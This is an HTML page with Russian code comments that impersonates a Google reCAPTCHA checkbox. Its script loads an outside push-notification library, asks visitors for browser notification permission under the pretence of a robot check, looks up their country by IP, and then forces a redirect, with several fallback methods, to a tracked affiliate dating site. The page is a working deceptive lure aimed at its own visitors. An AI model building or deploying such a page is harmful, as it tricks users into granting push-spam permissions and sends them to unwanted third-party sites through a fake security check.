<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="tlsdk" content="6ce3ce667cc14beabf44647a39a3694d">
    <title>reCAPTCHA</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            background-color: #f9f9f9;
            overflow: hidden;
        }
        .container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 10px;
        }
        .captcha-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 300px;
            padding: 10px;
            border: 1px solid #dfe1e5;
            border-radius: 4px;
            background-color: #fff;
        }
        .captcha-left {
            display: flex;
            align-items: center;
        }
        .captcha-checkbox {
            margin-right: 10px;
            width: 20px;
            height: 20px;
            cursor: pointer;
            border: 2px solid #5f6368;
            background-color: #fff;
            position: relative;
            appearance: none;
            -webkit-appearance: none;
            -moz-appearance: none;
        }
        .captcha-checkbox.completed {
            background-color: #1a73e8;
            border-color: #1a73e8;
            animation: fillCheckbox 0.3s ease;
        }
        .captcha-checkbox.completed::after {
            content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>');
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: block;
        }
        .captcha-checkbox.loading {
            background-color: #fff;
            border-color: #5f6368;
            cursor: wait;
        }
        .captcha-checkbox.loading::after {
            content: '';
            width: 12px;
            height: 12px;
            border: 2px solid #1a73e8;
            border-top-color: transparent;
            border-radius: 50%;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation: spin 0.8s linear infinite;
        }
        @keyframes fillCheckbox {
            0% {
                background-color: #fff;
                border-color: #5f6368;
            }
            100% {
                background-color: #1a73e8;
                border-color: #1a73e8;
            }
        }
        @keyframes spin {
            0% {
                transform: translate(-50%, -50%) rotate(0deg);
            }
            100% {
                transform: translate(-50%, -50%) rotate(360deg);
            }
        }
        .captcha-text {
            font-size: 14px;
            color: #202124;
        }
        .captcha-right {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
        }
        .captcha-logo {
            width: 20px;
            height: 20px;
            margin-bottom: 5px;
        }
        .captcha-brand {
            font-size: 12px;
            color: #1a73e8;
        }
        .captcha-links {
            font-size: 10px;
            color: #5f6368;
        }
        .captcha-links a {
            color: #5f6368;
            text-decoration: none;
        }
        .submit-button {
            padding: 8px 16px;
            background-color: #f1f3f4;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 14px;
            color: #202124;
            cursor: pointer;
        }
        .submit-button:hover {
            background-color: #e8eaed;
        }
        .button-container {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }
        .error {
            color: red;
            font-size: 12px;
            display: none;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <script type="application/javascript" src="https://lobpc.sjscdn.com/ps/ps.js?id=HnFv7gIgUEyhZsQd8kp20Q" async></script>
    <div class="container">
        <div class="captcha-container">
            <div class="captcha-left">
                <input type="checkbox" id="captcha" class="captcha-checkbox">
                <span class="captcha-text" id="captcha-text">I'm not a robot</span>
            </div>
            <div class="captcha-right">
                <img src="https://www.melett.ru/wp-content/uploads/2023/09/recaptcha-logo-icon.png" class="captcha-logo" alt="reCAPTCHA">
                <span class="captcha-brand">reCAPTCHA</span>
                <div class="captcha-links" id="captcha-links">
                    <a href="https://policies.google.com/privacy" target="_blank">Privacy</a> - 
                    <a href="https://policies.google.com/terms" target="_blank">Terms</a>
                </div>
            </div>
        </div>
        <div class="button-container">
            <button class="submit-button" id="submit-button">Submit</button>
            <div class="error" id="error">Please verify that you are not a robot.</div>
        </div>
    </div>

    <script>
        // Объект с переводами
        const translations = {
            'en': {
                captchaText: "I'm not a robot",
                submitButton: "Submit",
                error: "Please verify that you are not a robot.",
                privacy: "Privacy",
                terms: "Terms"
            },
            'ru': {
                captchaText: "Я не робот",
                submitButton: "Отправить",
                error: "Пожалуйста, подтвердите, что вы не робот.",
                privacy: "Конфиденциальность",
                terms: "Условия"
            },
            'es': {
                captchaText: "No soy un robot",
                submitButton: "Enviar",
                error: "Por favor, verifica que no eres un robot.",
                privacy: "Privacidad",
                terms: "Términos"
            }
            // Добавьте другие языки по необходимости
        };

        // Определение языка браузера
        function getBrowserLanguage() {
            const lang = navigator.language || navigator.userLanguage || 'en';
            return lang.split('-')[0]; // Берем только основной код языка (например, 'en' из 'en-US')
        }

        // Получение геолокации по IP
        async function getCountryByIP() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return data.country_code || 'US'; // Возвращаем код страны или 'US' по умолчанию
            } catch (e) {
                console.error('Ошибка получения геолокации:', e);
                return 'US'; // Код страны по умолчанию
            }
        }

        // Применение языка и контента
        async function applyLocalization() {
            const browserLang = getBrowserLanguage();
            const lang = translations[browserLang] ? browserLang : 'en'; // Используем английский по умолчанию
            const country = await getCountryByIP();

            // Устанавливаем язык документа
            document.documentElement.lang = lang;

            // Обновляем текст на странице
            document.getElementById('captcha-text').textContent = translations[lang].captchaText;
            document.getElementById('submit-button').textContent = translations[lang].submitButton;
            document.getElementById('error').textContent = translations[lang].error;

            // Обновляем ссылки
            const links = document.getElementById('captcha-links');
            links.innerHTML = `
                <a href="https://policies.google.com/privacy" target="_blank">${translations[lang].privacy}</a> - 
                <a href="https://policies.google.com/terms" target="_blank">${translations[lang].terms}</a>
            `;

            // Адаптация под страну (пример)
            const redirectUrlBase = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd0';
            let redirectUrl = redirectUrlBase;

            // Пример: модификация URL на основе страны
            if (country === 'RU') {
                redirectUrl += '&country=ru';
            } else if (country === 'ES') {
                redirectUrl += '&country=es';
            }

            console.log(`Язык: ${lang}, Страна: ${country}, Redirect URL: ${redirectUrl}`);
            return { lang, redirectUrl };
        }

        // Инициализация локализации
        applyLocalization().then(({ redirectUrl }) => {
            // Ссылка для редиректа
            window.redirectUrl = redirectUrl;

            // Функция для логирования подписки
            function logSubscription(permission, subId = 'test_campaign') {
                const data = {
                    id: 'HnFv7gIgUEyhZsQd8kp20Q',
                    sub_id: subId,
                    permission: permission,
                    timestamp: new Date().toISOString()
                };
                console.log('Лог подписки:', data);
            }

            // Функция для выполнения редиректа
            function performRedirect() {
                console.log('Попытка редиректа на:', window.redirectUrl);
                try {
                    const isWebView = navigator.userAgent.includes('wv') || navigator.userAgent.includes('WebView');
                    if (isWebView) {
                        console.log('Обнаружен WebView, используем location.assign');
                        window.location.assign(window.redirectUrl);
                    } else {
                        console.log('Стандартный редирект через location.href');
                        window.location.href = window.redirectUrl;
                    }
                    setTimeout(() => {
                        if (window.location.href !== window.redirectUrl) {
                            console.log('Резервный редирект через location.replace');
                            window.location.replace(window.redirectUrl);
                        }
                    }, 500);
                } catch (e) {
                    console.error('Ошибка редиректа:', e);
                    try {
                        console.log('Попытка редиректа через программный клик');
                        const link = document.createElement('a');
                        link.href = window.redirectUrl;
                        link.style.display = 'none';
                        document.body.appendChild(link);
                        link.click();
                        document.body.removeChild(link);
                    } catch (clickError) {
                        console.error('Ошибка программного клика:', clickError);
                        const error = document.getElementById('error');
                        error.innerHTML = `Failed to redirect. <a href="${window.redirectUrl}">Click here</a>`;
                        error.style.display = 'block';
                    }
                }
            }

            // Функция для ожидания загрузки ps.js
            function waitForPsJs(maxAttempts = 10, interval = 500) {
                return new Promise((resolve, reject) => {
                    let attempts = 0;
                    const checkPs = () => {
                        if (window.ps && typeof window.ps.showPrompt === 'function') {
                            console.log('ps.js загружен успешно');
                            resolve();
                        } else if (attempts >= maxAttempts) {
                            console.error('ps.js не загружен после максимального количества попыток');
                            reject(new Error('ps.js not loaded'));
                        } else {
                            attempts++;
                            console.log(`Ожидание ps.js, попытка ${attempts}/${maxAttempts}`);
                            setTimeout(checkPs, interval);
                        }
                    };
                    checkPs();
                });
            }

            // Функция для запроса подписки
            function requestSubscription(checkbox) {
                console.log('Запуск requestSubscription');
                try {
                    if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
                        console.log('Уведомления уже разрешены или заблокированы:', Notification.permission);
                        logSubscription(Notification.permission);
                        checkbox.classList.remove('loading');
                        checkbox.classList.add('completed');
                        setTimeout(() => {
                            console.log('Запуск редиректа после галочки');
                            performRedirect();
                        }, 1000);
                        return;
                    }

                    waitForPsJs()
                        .then(() => {
                            console.log('Вызываем подписку через ps.js');
                            window.ps.showPrompt()
                                .then(result => {
                                    console.log('Результат подписки:', result);
                                    logSubscription(Notification.permission);
                                    checkbox.classList.remove('loading');
                                    checkbox.classList.add('completed');
                                    setTimeout(() => {
                                        console.log('Запуск редиректа после галочки');
                                        performRedirect();
                                    }, 1000);
                                })
                                .catch(err => {
                                    console.error('Ошибка вызова подписки:', err);
                                    logSubscription(Notification.permission);
                                    checkbox.classList.remove('loading');
                                    checkbox.classList.add('completed');
                                    setTimeout(() => {
                                        console.log('Запуск редиректа после галочки');
                                        performRedirect();
                                    }, 1000);
                                });
                        })
                        .catch(() => {
                            console.log('API ps.js не доступен, пробуем Notification API');
                            if ('Notification' in window) {
                                Notification.requestPermission()
                                    .then(permission => {
                                        console.log('Результат разрешения:', permission);
                                        logSubscription(permission);
                                        checkbox.classList.remove('loading');
                                        checkbox.classList.add('completed');
                                        setTimeout(() => {
                                            console.log('Запуск редиректа после галочки');
                                            performRedirect();
                                        }, 1000);
                                    })
                                    .catch(err => {
                                        console.error('Ошибка Notification API:', err);
                                        logSubscription('error');
                                        checkbox.classList.remove('loading');
                                        checkbox.classList.add('completed');
                                        setTimeout(() => {
                                            console.log('Запуск редиректа после галочки');
                                            performRedirect();
                                        }, 1000);
                                    });
                            } else {
                                console.log('Уведомления не поддерживаются');
                                logSubscription('unsupported');
                                checkbox.classList.remove('loading');
                                checkbox.classList.add('completed');
                                setTimeout(() => {
                                    console.log('Запуск редиректа после галочки');
                                    performRedirect();
                                }, 1000);
                            }
                        });
                } catch (e) {
                    console.error('Общая ошибка в requestSubscription:', e);
                    logSubscription('error');
                    checkbox.classList.remove('loading');
                    checkbox.classList.add('completed');
                    setTimeout(() => {
                        console.log('Запуск редиректа после галочки');
                        performRedirect();
                    }, 1000);
                }
            }

            // Функция проверки
            function verify() {
                const checkbox = document.getElementById('captcha');
                const error = document.getElementById('error');
                if (checkbox.checked) {
                    console.log('Чекбокс отмечен, запускаем подписку');
                    error.style.display = 'none';
                    checkbox.disabled = true;
                    checkbox.classList.add('loading');
                    requestSubscription(checkbox);
                    checkbox.disabled = false;
                } else {
                    error.style.display = 'block';
                }
            }

            // События
            document.getElementById('captcha').addEventListener('click', () => {
                console.log('Чекбокс кликнут');
                const checkbox = document.getElementById('captcha');
                if (!checkbox.checked) {
                    checkbox.checked = true;
                }
                verify();
            });

            document.getElementById('submit-button').addEventListener('click', () => {
                console.log('Нажата кнопка Отправить');
                verify();
            });
        });
    </script>
</body>
</html>
